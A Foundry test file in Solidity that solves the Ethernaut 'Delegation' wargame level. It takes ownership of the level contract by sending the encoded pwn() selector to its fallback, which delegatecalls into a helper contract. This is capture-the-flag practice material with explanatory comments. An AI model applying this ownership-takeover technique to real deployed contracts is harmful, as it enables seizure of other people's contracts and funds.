// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Delegation/DelegationFactory.sol";
import "../src/Ethernaut.sol";

contract DelegationTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testDelegationHack() public {
        /****************
         * Factory setup *
         *************** */
        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress)); // 1000 is initial supply
        /****************
         *    Attack     *
         *************** */
        /*
         *The more direct way to call the Delegate and claim ownership
         * is through the fallback function, as this function call it and pass it msg.data
         * we can encode the function signature of the pwn() function to do so
         * 1. "complex" way
         * address(ethernautDelegation).call(abi.encode(bytes4(keccak256("pwn()"))));
         *2. straightforwad way
         */
        address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
        assertEq(ethernautDelegation.owner(), player);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
